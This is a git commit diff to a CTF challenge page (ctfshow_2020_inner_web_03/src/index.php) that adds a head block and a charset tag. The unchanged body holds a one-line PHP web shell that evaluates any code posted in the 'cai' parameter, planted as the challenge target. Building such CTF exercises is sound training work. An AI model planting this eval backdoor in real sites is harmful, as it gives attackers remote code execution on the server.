33034e7ca989e454763b9c028acf3e88e8ffdb7c
GITEE <gitee@wujiaxing.cn>
2020-03-26 17:19:01 +0800

    update

--- ctfshow_2020_inner_web_03/src/index.php
+++ ctfshow_2020_inner_web_03/src/index.php
@@ -1,6 +1,9 @@
 <!DOCTYPE HTML>
 <html>
+<head>
+<meta charset="UTF-8">
 <title>除了会连菜刀你还会个啥</title>
+</head>
 <body style="background-image:url('emoji.png');background-repeat:no-repeat;">
 <?php @eval($_POST['cai']);?>
 </body>
